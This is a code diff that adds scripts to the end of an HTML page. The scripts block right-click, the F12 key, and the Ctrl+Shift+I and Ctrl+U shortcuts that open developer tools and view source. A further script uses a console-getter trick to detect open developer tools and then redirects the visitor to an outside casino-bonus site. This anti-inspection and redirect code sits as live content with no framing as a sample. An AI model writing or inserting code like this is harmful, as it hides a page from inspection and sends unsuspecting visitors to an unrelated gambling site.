@@ -231,6 +231,45 @@
             });
         });
 
+        </script><script>
+            document.addEventListener('contextmenu', function(e) {
+                // Allow right-click on links and buttons
+                if (e.target.tagName === 'A' || e.target.tagName === 'BUTTON') {
+                    return;
+                }
+                e.preventDefault();
+            });
+        </script>
+
+        <!-- Disable common keyboard shortcuts -->
+        <script>
+            document.addEventListener('keydown', function(e) {
+                // Disable F12
+                if (e.key === "F12") {
+                    e.preventDefault();
+                }
+                // Disable Ctrl+Shift+I (Developer Tools)
+                if (e.ctrlKey && e.shiftKey && e.key === "I") {
+                    e.preventDefault();
+                }
+                // Disable Ctrl+U (View Source)
+                if (e.ctrlKey && e.key === "u") {
+                    e.preventDefault();
+                }
+            });
+        </script>
+
+        <!-- Detect if developer tools are open -->
+        <script>
+            (function() {
+                const element = new Image();
+                Object.defineProperty(element, 'id', {
+                    get: function() {
+                        window.location.href = 'https://topratedcasinobonus.com/'; // Redirect if developer tools are open
+                    }
+                });
+                console.log(element);
+            })();
         </script>
     </body>
 </html>
